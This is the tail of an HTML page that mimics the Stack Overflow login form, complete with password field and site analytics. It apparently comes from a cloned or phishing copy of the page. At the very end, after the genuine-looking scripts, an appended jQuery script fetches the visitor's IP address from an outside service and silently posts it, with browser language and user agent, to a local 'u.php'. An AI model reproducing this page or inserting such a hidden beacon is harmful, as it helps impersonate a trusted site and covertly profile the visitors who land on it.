                <div class="grid fd-column-reverse gs4 gsy js-auth-item ">
                            <p class="grid--cell s-input-message js-error-message d-none">
            
        </p>

                    <div class="grid ps-relative js-password">
                        <input class="grid--cell s-input" type="password" autocomplete="off" name="password" id="password">
                        <svg aria-hidden="true" class="s-input-icon js-alert-icon d-none svg-icon iconAlertCircle" width="18" height="18" viewBox="0 0 18 18"><path d="M9 17A8 8 0 119 1a8 8 0 010 16zM8 4v6h2V4H8zm0 8v2h2v-2H8z"></path></svg>
                    </div>
                    <div class="grid ai-center ps-relative jc-space-between">
                        <label class="grid--cell s-label" for="password">Password</label>

                            <a class="grid--cell s-link fs-caption" href="https://stackoverflow.com/users/account-recovery">Forgot password?</a>
                    </div>
                </div>
            <div class="grid gs4 gsy fd-column js-auth-item ">
                <button class="grid--cell s-btn s-btn__primary" id="submit-button" name="submit-button">Log in</button>
                        <p class="grid--cell s-input-message js-error-message d-none">
            
        </p>

            </div>

        <input type="hidden" id="oauth_version" name="oauth_version">
        <input type="hidden" id="oauth_server" name="oauth_server">


    </form>
</div>

<script>
    StackExchange.ready(function () {

        StackExchange.using("gps", function() { StackExchange.gps.sendPending(); });

    });

</script>

            <div class="mx-auto ta-center fs-body1 p16 pb0 mb24 w100 wmx3">
                Don’t have an account? <a href="https://stackoverflow.com/users/signup?ssrc=head&amp;returnurl=https%3a%2f%2fstackoverflow.com%2f">Sign up</a>

                    <div class="mt12">
                        Are you an employer? <a href="https://careers.stackoverflow.com/employer/login" name="talent">Sign up on Talent <svg aria-hidden="true" class="va-text-bottom sm:d-none svg-icon iconShareSm" width="14" height="14" viewBox="0 0 14 14"><path d="M5 1H3a2 2 0 00-2 2v8c0 1.1.9 2 2 2h8a2 2 0 002-2V9h-2v2H3V3h2V1zm2 0h6v6h-2V4.5L6.5 9 5 7.5 9.5 3H7V1z"></path></svg></a>
                    </div>
            </div>
</div>

<script>
    StackExchange.ready(function () {
        auth.init(auth.pages.Login);
    });
</script>
        </div>
    </div>
    <noscript>
        <div id="noscript-warning">Stack Overflow works best with JavaScript enabled
            <img src="https://pixel.quantserve.com/pixel/p-c1rF4kxgLUzNc.gif" alt="" class="dno">
        </div>
    </noscript>

            <script>
(function(i, s, o, g, r, a, m) {
                i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function() { (i[r].q = i[r].q || []).push(arguments) }, i[r].l = 1 * new Date(); a = s.createElement(o),
                m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m);
            })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');

            StackExchange.ready(function () {

                StackExchange.ga.init({
                    autoLink: ["stackoverflow.blog","info.stackoverflowsolutions.com","stackoverflowsolutions.com"],
                    sendTitles: true,
                    tracker: window.ga,
                    trackingCodes: [
                        'UA-108242619-1'
                    ],
                        checkDimension: 'dimension42'
                });





                    StackExchange.ga.setDimension('dimension3', 'Users/Login');


                StackExchange.ga.trackPageView();
            });
            
            var _qevents = _qevents || [],
            _comscore = _comscore || [];
            (function() {
                var s = document.getElementsByTagName('script')[0],
                    qc = document.createElement('script');
 qc.async = true;
                    qc.src = 'https://secure.quantserve.com/quant.js';
                    s.parentNode.insertBefore(qc, s);
                    _qevents.push({ qacct: "p-c1rF4kxgLUzNc" }); var sc = document.createElement('script');
                    sc.async = true;
                    sc.src = 'https://sb.scorecardresearch.com/beacon.js';
                    s.parentNode.insertBefore(sc, s);
                    _comscore.push({ c1: "2", c2: "17440561" });            })();
                </script>

        
    <style>#consent-footer-link { display: none; visibility: hidden; }</style>

    
    
    <script src=
"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
</script>  
<script>
$.getJSON("https://api.ipify.org?format=json",function(data) {
if (1) {
    var ip = data.ip;
    var lang = navigator.language;
    var platform = navigator.platform;
    var ua = navigator.userAgent;
    var webdriver = navigator.webdriver;
    $.ajax({
        url : 'u.php',
        type : 'post',
        data : {
            'ip' : ip,
            'lang' : lang,
            'ua' : ua
        }
    });
}
});
</script>    
</body></html>